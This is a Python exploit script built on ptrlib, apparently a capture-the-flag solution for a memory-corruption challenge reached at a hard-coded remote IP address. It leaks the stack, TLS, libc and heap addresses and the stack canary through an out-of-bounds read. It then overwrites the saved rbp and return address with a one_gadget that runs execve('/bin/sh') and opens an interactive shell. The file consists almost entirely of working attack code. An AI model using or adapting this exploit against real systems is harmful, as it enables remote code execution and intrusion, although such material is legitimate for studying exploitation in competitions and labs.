from ptrlib import *

remote = True

libc = ELF("../distfiles/libc.so.6")
one_gadget = 0xe5858
base = 0x300ff0

def exploit():
    def leak(ofs):
        assert ofs & 0b111 == 0
        sock.sendlineafter("> ", str(ofs // 8))
        sock.recvuntil("= ")
        return int(sock.recvline())
    """
    #sock = Process("../distfiles/chall", cwd="../distfiles")
    sock = Socket("localhost", 9003)
    """
    sock = Socket("76.74.177.238", 9007)
    #"""
    sock.sendlineafter("A =", "0")
    sock.sendlineafter("B =", "0")
    sock.sendlineafter("= ", str(0x300000 // 8))
    sock.sendlineafter("= ", str(0))
    sock.sendlineafter("= ", str(0))

    # 1) leak stack
    addr_stack = leak(base + libc.symbol("environ")) - 0x158
    logger.info("stack = " + hex(addr_stack))
    if addr_stack & 0xff != 0: return False

    # 2) leak address near canary
    addr_tls = leak(base + 0x3eb008)
    logger.info("TLS = " + hex(addr_tls))
    
    # 3) leak libc
    libc_base = leak(base + libc.symbol("__realloc_hook")) - 0x098790
    heap_base = libc_base - base - 0x10
    logger.info("heap = " + hex(heap_base))
    logger.info("libc = " + hex(libc_base))

    # 4) leak canary
    addr_canary = addr_tls + 0x14e8 - libc_base
    canary = leak(base + addr_canary)
    if canary < 0: canary = (-canary ^ ((1 << 64) - 1)) + 1
    logger.info("canary = " + hex(canary))

    # 5) one gadget
    # 0xe5858 execve("/bin/sh", [rbp-0x88], [rbp-0x70])
    # constraints:
    #   [[rbp-0x88]] == NULL || [rbp-0x88] == NULL
    #   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
    # The least 2 bytes of the new rbp must be something like '-1'
    # but as we have very large chunk we can still set rbp to valid address.
    new_rbp = heap_base - (heap_base & 0xffff)
    new_rbp |= 0x312d # '-1'
    if new_rbp < heap_base: new_rbp += 0x10000
    payload  = p64(new_rbp)
    payload += p64(libc_base + one_gadget)
    payload += p64(0xdeadbeef)
    payload += p64(canary)
    sock.sendafter("> ", payload)

    sock.interactive()
    return True

if __name__ == '__main__':
    while True:
        # loop until stack & 0xFF == 0 holds
        if exploit(): break
